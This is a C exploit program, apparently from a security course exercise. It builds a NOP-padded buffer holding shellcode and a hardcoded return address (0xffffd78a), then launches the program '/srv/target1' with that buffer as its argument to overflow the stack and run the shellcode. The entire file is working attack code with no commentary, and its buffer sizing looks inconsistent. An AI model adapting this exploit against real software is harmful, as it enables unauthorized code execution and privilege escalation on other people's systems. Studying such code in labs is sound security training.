#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

const int BUFFER_SIZE = 12;
const int OFFSET_TO_RET = 8;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
const char* RETURN_ADDRESS = (char*)0xffffd78a;

int main(void)
{
char *args[3];
char *env[1];

char buf[BUFFER_SIZE + OFFSET_TO_RET + 1];
memset(buf, '\x90', sizeof(buf));
buf[BUFFER_SIZE + OFFSET_TO_RET] = 0;
memcpy(buf + OFFSET_TO_RET, shellcode, SHELLCODE_LENGTH);
*(unsigned int*)(buf + OFFSET_TO_RET - 4) = (unsigned int)RETURN_ADDRESS;

args[0] = TARGET;
args[1] = buf;
args[2] = NULL;

env[0] = NULL;
execve(TARGET, args, env);
fprintf(stderr, "execve failed.\n");

return 0;
}


